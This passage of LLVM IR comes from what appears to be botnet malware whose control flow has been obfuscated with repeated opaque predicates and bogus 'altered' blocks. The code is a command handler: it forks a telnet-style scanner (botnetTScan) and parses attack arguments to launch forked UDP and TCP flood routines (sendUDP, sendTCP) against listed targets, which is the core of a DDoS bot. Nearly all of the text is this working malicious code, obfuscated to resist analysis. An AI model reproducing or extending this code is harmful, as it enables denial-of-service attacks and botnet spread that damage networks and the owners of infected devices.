  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %71
  %80 = load i32, i32* @botnetPid, align 4
  %81 = icmp ne i32 %80, 0
  %82 = load i32, i32* @x.103
  %83 = load i32, i32* @y.104
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %81, label %90, label %91

; <label>:90:                                     ; preds = %originalBBpart24
  br label %1091

; <label>:91:                                     ; preds = %originalBBpart24
  %92 = call i32 @fork() #3
  store i32 %92, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %93 = load i32, i32* %5, align 4
  %94 = icmp ugt i32 %93, 0
  br i1 %94, label %95, label %97

; <label>:95:                                     ; preds = %91
  %96 = load i32, i32* %5, align 4
  store i32 %96, i32* @botnetPid, align 4
  br label %1091

; <label>:97:                                     ; preds = %91
  %98 = load i32, i32* @x.103
  %99 = load i32, i32* @y.104
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %97
  %106 = load i32, i32* %5, align 4
  %107 = icmp eq i32 %106, -1
  %108 = load i32, i32* @x.103
  %109 = load i32, i32* @y.104
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %107, label %116, label %133

; <label>:116:                                    ; preds = %originalBBpart28
  %117 = load i32, i32* @x.103
  %118 = load i32, i32* @y.104
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %116
  %125 = load i32, i32* @x.103
  %126 = load i32, i32* @y.104
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %1091

; <label>:133:                                    ; preds = %originalBBpart28
  %134 = load i32, i32* @x.103
  %135 = load i32, i32* @y.104
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %133
  %142 = load i32, i32* @x.103
  %143 = load i32, i32* @y.104
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %150

; <label>:150:                                    ; preds = %originalBBpart216
  %151 = load i32, i32* %7, align 4
  %152 = load i32, i32* %6, align 4
  call void @botnetTScan(i32 %151, i32 %152)
  call void @_exit(i32 0) #12
  unreachable

; <label>:153:                                    ; preds = %originalBBpart2
  %154 = load i32, i32* @x.103
  %155 = load i32, i32* @y.104
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %153
  %162 = load i32, i32* @x.103
  %163 = load i32, i32* @y.104
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %170

; <label>:170:                                    ; preds = %originalBBpart220, %2
  %171 = load i8**, i8*** %4, align 8
  %172 = getelementptr inbounds i8*, i8** %171, i64 0
  %173 = load i8*, i8** %172, align 8
  %174 = call i32 @strcmp(i8* %173, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.131, i32 0, i32 0)) #9
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %431, label %176

; <label>:176:                                    ; preds = %170
  %177 = load i32, i32* %3, align 4
  %178 = icmp slt i32 %177, 6
  br i1 %178, label %262, label %179

; <label>:179:                                    ; preds = %176
  %180 = load i8**, i8*** %4, align 8
  %181 = getelementptr inbounds i8*, i8** %180, i64 3
  %182 = load i8*, i8** %181, align 8
  %183 = call i32 @atoi(i8* %182) #9
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %262, label %185

; <label>:185:                                    ; preds = %179
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 2
  %188 = load i8*, i8** %187, align 8
  %189 = call i32 @atoi(i8* %188) #9
  %190 = icmp eq i32 %189, -1
  br i1 %190, label %262, label %191

; <label>:191:                                    ; preds = %185
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 4
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #9
  %196 = icmp eq i32 %195, -1
  br i1 %196, label %262, label %197

; <label>:197:                                    ; preds = %191
  %198 = load i8**, i8*** %4, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 5
  %200 = load i8*, i8** %199, align 8
  %201 = call i32 @atoi(i8* %200) #9
  %202 = icmp eq i32 %201, -1
  br i1 %202, label %262, label %203

; <label>:203:                                    ; preds = %197
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 5
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @atoi(i8* %206) #9
  %208 = icmp sgt i32 %207, 65536
  br i1 %208, label %262, label %209

; <label>:209:                                    ; preds = %203
  %210 = load i32, i32* @x.103
  %211 = load i32, i32* @y.104
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %209
  %218 = load i8**, i8*** %4, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 5
  %220 = load i8*, i8** %219, align 8
  %221 = call i32 @atoi(i8* %220) #9
  %222 = icmp sgt i32 %221, 65500
  %223 = load i32, i32* @x.103
  %224 = load i32, i32* @y.104
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %222, label %262, label %231

; <label>:231:                                    ; preds = %originalBBpart224
  %232 = load i8**, i8*** %4, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 4
  %234 = load i8*, i8** %233, align 8
  %235 = call i32 @atoi(i8* %234) #9
  %236 = icmp sgt i32 %235, 32
  br i1 %236, label %262, label %237

; <label>:237:                                    ; preds = %231
  %238 = load i32, i32* @x.103
  %239 = load i32, i32* @y.104
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %237
  %246 = load i32, i32* %3, align 4
  %247 = icmp eq i32 %246, 7
  %248 = load i32, i32* @x.103
  %249 = load i32, i32* @y.104
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %247, label %256, label %279

; <label>:256:                                    ; preds = %originalBBpart228
  %257 = load i8**, i8*** %4, align 8
  %258 = getelementptr inbounds i8*, i8** %257, i64 6
  %259 = load i8*, i8** %258, align 8
  %260 = call i32 @atoi(i8* %259) #9
  %261 = icmp slt i32 %260, 1
  br i1 %261, label %262, label %279

; <label>:262:                                    ; preds = %256, %231, %originalBBpart224, %203, %197, %191, %185, %179, %176
  %263 = load i32, i32* @x.103
  %264 = load i32, i32* @y.104
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %262
  %271 = load i32, i32* @x.103
  %272 = load i32, i32* @y.104
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %1091

; <label>:279:                                    ; preds = %256, %originalBBpart228
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 1
  %282 = load i8*, i8** %281, align 8
  store i8* %282, i8** %8, align 8
  %283 = load i8**, i8*** %4, align 8
  %284 = getelementptr inbounds i8*, i8** %283, i64 2
  %285 = load i8*, i8** %284, align 8
  %286 = call i32 @atoi(i8* %285) #9
  store i32 %286, i32* %9, align 4
  %287 = load i8**, i8*** %4, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 3
  %289 = load i8*, i8** %288, align 8
  %290 = call i32 @atoi(i8* %289) #9
  store i32 %290, i32* %10, align 4
  %291 = load i8**, i8*** %4, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 4
  %293 = load i8*, i8** %292, align 8
  %294 = call i32 @atoi(i8* %293) #9
  store i32 %294, i32* %11, align 4
  %295 = load i8**, i8*** %4, align 8
  %296 = getelementptr inbounds i8*, i8** %295, i64 5
  %297 = load i8*, i8** %296, align 8
  %298 = call i32 @atoi(i8* %297) #9
  store i32 %298, i32* %12, align 4
  %299 = load i32, i32* %3, align 4
  %300 = icmp sgt i32 %299, 6
  br i1 %300, label %301, label %306

; <label>:301:                                    ; preds = %279
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds i8*, i8** %302, i64 6
  %304 = load i8*, i8** %303, align 8
  %305 = call i32 @atoi(i8* %304) #9
  br label %307

; <label>:306:                                    ; preds = %279
  br label %307

; <label>:307:                                    ; preds = %306, %301
  %308 = phi i32 [ %305, %301 ], [ 1000, %306 ]
  %309 = load i32, i32* @x.103
  %310 = load i32, i32* @y.104
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %307
  store i32 %308, i32* %13, align 4
  %317 = load i32, i32* %3, align 4
  %318 = icmp sgt i32 %317, 7
  %319 = load i32, i32* @x.103
  %320 = load i32, i32* @y.104
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %318, label %327, label %348

; <label>:327:                                    ; preds = %originalBBpart236
  %328 = load i32, i32* @x.103
  %329 = load i32, i32* @y.104
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %327
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 7
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @atoi(i8* %338) #9
  %340 = load i32, i32* @x.103
  %341 = load i32, i32* @y.104
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %349

; <label>:348:                                    ; preds = %originalBBpart236
  br label %349

; <label>:349:                                    ; preds = %348, %originalBBpart240
  %350 = phi i32 [ %339, %originalBBpart240 ], [ 1000000, %348 ]
  store i32 %350, i32* %14, align 4
  %351 = load i32, i32* %3, align 4
  %352 = icmp sgt i32 %351, 8
  br i1 %352, label %353, label %358

; <label>:353:                                    ; preds = %349
  %354 = load i8**, i8*** %4, align 8
  %355 = getelementptr inbounds i8*, i8** %354, i64 8
  %356 = load i8*, i8** %355, align 8
  %357 = call i32 @atoi(i8* %356) #9
  br label %359

; <label>:358:                                    ; preds = %349
  br label %359

; <label>:359:                                    ; preds = %358, %353
  %360 = phi i32 [ %357, %353 ], [ 0, %358 ]
  store i32 %360, i32* %15, align 4
  %361 = load i8*, i8** %8, align 8
  %362 = call i8* @strstr(i8* %361, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #9
  %363 = icmp ne i8* %362, null
  br i1 %363, label %364, label %385

; <label>:364:                                    ; preds = %359
  %365 = load i8*, i8** %8, align 8
  %366 = call i8* @strtok(i8* %365, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %366, i8** %16, align 8
  br label %367

; <label>:367:                                    ; preds = %382, %364
  %368 = load i8*, i8** %16, align 8
  %369 = icmp ne i8* %368, null
  br i1 %369, label %370, label %384

; <label>:370:                                    ; preds = %367
  %371 = call i32 @listFork()
  %372 = icmp ne i32 %371, 0
  br i1 %372, label %382, label %373

; <label>:373:                                    ; preds = %370
  %374 = load i8*, i8** %16, align 8
  %375 = load i32, i32* %9, align 4
  %376 = load i32, i32* %10, align 4
  %377 = load i32, i32* %11, align 4
  %378 = load i32, i32* %12, align 4
  %379 = load i32, i32* %13, align 4
  %380 = load i32, i32* %14, align 4
  %381 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %374, i32 %375, i32 %376, i32 %377, i32 %378, i32 %379, i32 %380, i32 %381)
  call void @_exit(i32 0) #12
  unreachable

; <label>:382:                                    ; preds = %370
  %383 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %383, i8** %16, align 8
  br label %367

; <label>:384:                                    ; preds = %367
  br label %414

; <label>:385:                                    ; preds = %359
  %386 = call i32 @listFork()
  %387 = icmp ne i32 %386, 0
  br i1 %387, label %397, label %388

; <label>:388:                                    ; preds = %385
  %389 = load i8*, i8** %8, align 8
  %390 = load i32, i32* %9, align 4
  %391 = load i32, i32* %10, align 4
  %392 = load i32, i32* %11, align 4
  %393 = load i32, i32* %12, align 4
  %394 = load i32, i32* %13, align 4
  %395 = load i32, i32* %14, align 4
  %396 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %389, i32 %390, i32 %391, i32 %392, i32 %393, i32 %394, i32 %395, i32 %396)
  call void @_exit(i32 0) #12
  unreachable

; <label>:397:                                    ; preds = %385
  %398 = load i32, i32* @x.103
  %399 = load i32, i32* @y.104
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %397
  %406 = load i32, i32* @x.103
  %407 = load i32, i32* @y.104
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %414

; <label>:414:                                    ; preds = %originalBBpart244, %384
  %415 = load i32, i32* @x.103
  %416 = load i32, i32* @y.104
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %414
  %423 = load i32, i32* @x.103
  %424 = load i32, i32* @y.104
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %1091

; <label>:431:                                    ; preds = %170
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 0
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @strcmp(i8* %434, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.132, i32 0, i32 0)) #9
  %436 = icmp ne i32 %435, 0
  br i1 %436, label %686, label %437

; <label>:437:                                    ; preds = %431
  %438 = load i32, i32* %3, align 4
  %439 = icmp slt i32 %438, 6
  br i1 %439, label %546, label %440

; <label>:440:                                    ; preds = %437
  %441 = load i8**, i8*** %4, align 8
  %442 = getelementptr inbounds i8*, i8** %441, i64 3
  %443 = load i8*, i8** %442, align 8
  %444 = call i32 @atoi(i8* %443) #9
  %445 = icmp eq i32 %444, -1
  br i1 %445, label %546, label %446

; <label>:446:                                    ; preds = %440
  %447 = load i8**, i8*** %4, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 2
  %449 = load i8*, i8** %448, align 8
  %450 = call i32 @atoi(i8* %449) #9
  %451 = icmp eq i32 %450, -1
  br i1 %451, label %546, label %452

; <label>:452:                                    ; preds = %446
  %453 = load i32, i32* @x.103
  %454 = load i32, i32* @y.104
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %452
  %461 = load i8**, i8*** %4, align 8
  %462 = getelementptr inbounds i8*, i8** %461, i64 4
  %463 = load i8*, i8** %462, align 8
  %464 = call i32 @atoi(i8* %463) #9
  %465 = icmp eq i32 %464, -1
  %466 = load i32, i32* @x.103
  %467 = load i32, i32* @y.104
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %465, label %546, label %474

; <label>:474:                                    ; preds = %originalBBpart252
  %475 = load i32, i32* @x.103
  %476 = load i32, i32* @y.104
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %474
  %483 = load i8**, i8*** %4, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 4
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @atoi(i8* %485) #9
  %487 = icmp sgt i32 %486, 32
  %488 = load i32, i32* @x.103
  %489 = load i32, i32* @y.104
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %487, label %546, label %496

; <label>:496:                                    ; preds = %originalBBpart256
  %497 = load i32, i32* @x.103
  %498 = load i32, i32* @y.104
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %496
  %505 = load i32, i32* %3, align 4
  %506 = icmp sgt i32 %505, 6
  %507 = load i32, i32* @x.103
  %508 = load i32, i32* @y.104
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %506, label %515, label %537

; <label>:515:                                    ; preds = %originalBBpart260
  %516 = load i32, i32* @x.103
  %517 = load i32, i32* @y.104
  %518 = sub i32 %516, 1
  %519 = mul i32 %516, %518
  %520 = urem i32 %519, 2
  %521 = icmp eq i32 %520, 0
  %522 = icmp slt i32 %517, 10
  %523 = or i1 %521, %522
  br i1 %523, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %515
  %524 = load i8**, i8*** %4, align 8
  %525 = getelementptr inbounds i8*, i8** %524, i64 6
  %526 = load i8*, i8** %525, align 8
  %527 = call i32 @atoi(i8* %526) #9
  %528 = icmp slt i32 %527, 0
  %529 = load i32, i32* @x.103
  %530 = load i32, i32* @y.104
  %531 = sub i32 %529, 1
  %532 = mul i32 %529, %531
  %533 = urem i32 %532, 2
  %534 = icmp eq i32 %533, 0
  %535 = icmp slt i32 %530, 10
  %536 = or i1 %534, %535
  br i1 %536, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %528, label %546, label %537

; <label>:537:                                    ; preds = %originalBBpart264, %originalBBpart260
  %538 = load i32, i32* %3, align 4
  %539 = icmp eq i32 %538, 8
  br i1 %539, label %540, label %547

; <label>:540:                                    ; preds = %537
  %541 = load i8**, i8*** %4, align 8
  %542 = getelementptr inbounds i8*, i8** %541, i64 7
  %543 = load i8*, i8** %542, align 8
  %544 = call i32 @atoi(i8* %543) #9
  %545 = icmp slt i32 %544, 1
  br i1 %545, label %546, label %547

; <label>:546:                                    ; preds = %540, %originalBBpart264, %originalBBpart256, %originalBBpart252, %446, %440, %437
  br label %1091

; <label>:547:                                    ; preds = %540, %537
  %548 = load i32, i32* @x.103
  %549 = load i32, i32* @y.104
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %547
  %556 = load i8**, i8*** %4, align 8
  %557 = getelementptr inbounds i8*, i8** %556, i64 1
  %558 = load i8*, i8** %557, align 8
  store i8* %558, i8** %17, align 8
  %559 = load i8**, i8*** %4, align 8
  %560 = getelementptr inbounds i8*, i8** %559, i64 2
  %561 = load i8*, i8** %560, align 8
  %562 = call i32 @atoi(i8* %561) #9
  store i32 %562, i32* %18, align 4
  %563 = load i8**, i8*** %4, align 8
  %564 = getelementptr inbounds i8*, i8** %563, i64 3
  %565 = load i8*, i8** %564, align 8
  %566 = call i32 @atoi(i8* %565) #9
  store i32 %566, i32* %19, align 4
  %567 = load i8**, i8*** %4, align 8
  %568 = getelementptr inbounds i8*, i8** %567, i64 4
  %569 = load i8*, i8** %568, align 8
  %570 = call i32 @atoi(i8* %569) #9
  store i32 %570, i32* %20, align 4
  %571 = load i8**, i8*** %4, align 8
  %572 = getelementptr inbounds i8*, i8** %571, i64 5
  %573 = load i8*, i8** %572, align 8
  store i8* %573, i8** %21, align 8
  %574 = load i32, i32* %3, align 4
  %575 = icmp eq i32 %574, 8
  %576 = load i32, i32* @x.103
  %577 = load i32, i32* @y.104
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %575, label %584, label %589

; <label>:584:                                    ; preds = %originalBBpart268
  %585 = load i8**, i8*** %4, align 8
  %586 = getelementptr inbounds i8*, i8** %585, i64 7
  %587 = load i8*, i8** %586, align 8
  %588 = call i32 @atoi(i8* %587) #9
  br label %590

; <label>:589:                                    ; preds = %originalBBpart268
  br label %590

; <label>:590:                                    ; preds = %589, %584
  %591 = phi i32 [ %588, %584 ], [ 10, %589 ]
  store i32 %591, i32* %22, align 4
  %592 = load i32, i32* %3, align 4
  %593 = icmp sgt i32 %592, 6
  br i1 %593, label %594, label %599

; <label>:594:                                    ; preds = %590
  %595 = load i8**, i8*** %4, align 8
  %596 = getelementptr inbounds i8*, i8** %595, i64 6
  %597 = load i8*, i8** %596, align 8
  %598 = call i32 @atoi(i8* %597) #9
  br label %600

; <label>:599:                                    ; preds = %590
  br label %600

; <label>:600:                                    ; preds = %599, %594
  %601 = phi i32 [ %598, %594 ], [ 0, %599 ]
  store i32 %601, i32* %23, align 4
  %602 = load i8*, i8** %17, align 8
  %603 = call i8* @strstr(i8* %602, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #9
  %604 = icmp ne i8* %603, null
  br i1 %604, label %605, label %641

; <label>:605:                                    ; preds = %600
  %606 = load i8*, i8** %17, align 8
  %607 = call i8* @strtok(i8* %606, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %607, i8** %24, align 8
  br label %608

; <label>:608:                                    ; preds = %638, %605
  %609 = load i8*, i8** %24, align 8
  %610 = icmp ne i8* %609, null
  br i1 %610, label %611, label %640

; <label>:611:                                    ; preds = %608
  %612 = call i32 @listFork()
  %613 = icmp ne i32 %612, 0
  br i1 %613, label %638, label %614

; <label>:614:                                    ; preds = %611
  %615 = load i32, i32* @x.103
  %616 = load i32, i32* @y.104
  %617 = sub i32 %615, 1
  %618 = mul i32 %615, %617
  %619 = urem i32 %618, 2
  %620 = icmp eq i32 %619, 0
  %621 = icmp slt i32 %616, 10
  %622 = or i1 %620, %621
  br i1 %622, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %614
  %623 = load i8*, i8** %24, align 8
  %624 = load i32, i32* %18, align 4
  %625 = load i32, i32* %19, align 4
  %626 = load i32, i32* %20, align 4
  %627 = load i8*, i8** %21, align 8
  %628 = load i32, i32* %23, align 4
  %629 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %623, i32 %624, i32 %625, i32 %626, i8* %627, i32 %628, i32 %629)
  call void @_exit(i32 0) #12
  %630 = load i32, i32* @x.103
  %631 = load i32, i32* @y.104
  %632 = sub i32 %630, 1
  %633 = mul i32 %630, %632
  %634 = urem i32 %633, 2
  %635 = icmp eq i32 %634, 0
  %636 = icmp slt i32 %631, 10
  %637 = or i1 %635, %636
  br i1 %637, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  unreachable

; <label>:638:                                    ; preds = %611
  %639 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %639, i8** %24, align 8
  br label %608

; <label>:640:                                    ; preds = %608
  br label %685

; <label>:641:                                    ; preds = %600
  %642 = call i32 @listFork()
  %643 = icmp ne i32 %642, 0
  br i1 %643, label %668, label %644

; <label>:644:                                    ; preds = %641
  %645 = load i32, i32* @x.103
  %646 = load i32, i32* @y.104
  %647 = sub i32 %645, 1
  %648 = mul i32 %645, %647
  %649 = urem i32 %648, 2
  %650 = icmp eq i32 %649, 0
  %651 = icmp slt i32 %646, 10
  %652 = or i1 %650, %651
  br i1 %652, label %originalBB74, label %originalBB74alteredBB

